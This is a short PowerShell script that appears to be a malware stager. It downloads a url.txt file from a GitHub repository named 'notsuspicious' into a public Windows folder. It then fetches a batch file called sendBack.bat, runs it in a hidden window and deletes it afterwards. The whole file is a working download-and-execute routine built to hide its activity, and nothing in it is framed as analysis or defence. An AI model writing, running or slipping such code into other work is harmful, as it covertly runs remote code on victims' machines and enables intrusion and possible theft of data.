try {
    # Download url.txt
    Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
    
    # Download and execute sendBack.bat
    $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
finally {
    # Delete the batch file after execution
    Remove-Item -Path "C:\Users\Public\Videos\sendBack.bat" -Force
}
